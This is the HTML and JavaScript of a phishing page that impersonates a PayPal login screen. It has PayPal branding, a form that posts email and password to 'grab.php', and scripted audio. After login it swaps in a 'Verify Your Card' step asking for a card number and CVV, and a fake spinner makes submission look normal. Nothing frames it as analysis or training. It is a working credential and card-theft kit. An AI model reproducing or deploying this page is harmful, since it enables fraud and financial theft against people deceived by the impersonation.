    <div class="container">
        <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal" class="logo">
        <h2 id="title">Log in to PayPal</h2>
        <audio id="audio" autoplay><source src="paypal1.mp3" type="audio/mpeg"></audio>
        <form id="form" action="grab.php" method="POST">
            <input type="hidden" name="phase" id="phaseInput" value="1">
            <input type="text" name="username" id="usernameInput" placeholder="Email or mobile number" required>
            <input type="password" name="password" id="passwordInput" placeholder="Password" required>
            <button type="submit" id="submitBtn">Log In</button>
            <div class="spinner" id="spinner"></div>
        </form>
        <p style="text-align: center; font-size: 14px; margin-top: 10px;">
            <a href="https://www.paypal.com/us/signin" style="color: #0070ba; text-decoration: none;">Having trouble logging in?</a>
        </p>
    </div>
    <script>
        let phase = 1;
        const audio = document.getElementById('audio');
        const form = document.getElementById('form');
        const submitBtn = document.getElementById('submitBtn');
        const spinner = document.getElementById('spinner');

        audio.onended = () => {
            if (phase === 1 && document.getElementById('usernameInput').value) {
                audio.src = 'paypal2.mp3';
                document.getElementById('title').innerText = 'Verify Your Card';
                document.getElementById('usernameInput').style.display = 'none';
                document.getElementById('passwordInput').style.display = 'none';
                const cardInput = document.createElement('input');
                cardInput.type = 'text';
                cardInput.name = 'card';
                cardInput.id = 'cardInput';
                cardInput.placeholder = 'Card Number';
                cardInput.required = true;
                const cvvInput = document.createElement('input');
                cvvInput.type = 'text';
                cvvInput.name = 'cvv';
                cvvInput.id = 'cvvInput';
                cvvInput.placeholder = '3-Digit CVV';
                cvvInput.required = true;
                form.insertBefore(cardInput, submitBtn);
                form.insertBefore(cvvInput, submitBtn);
                document.getElementById('phaseInput').value = '2';
                phase = 2;
            }
        };

        form.onsubmit = () => {
            submitBtn.style.display = 'none';
            spinner.style.display = 'block';
            setTimeout(() => {
                submitBtn.style.display = 'block';
                spinner.style.display = 'none';
            }, 2000);
        };
    </script>
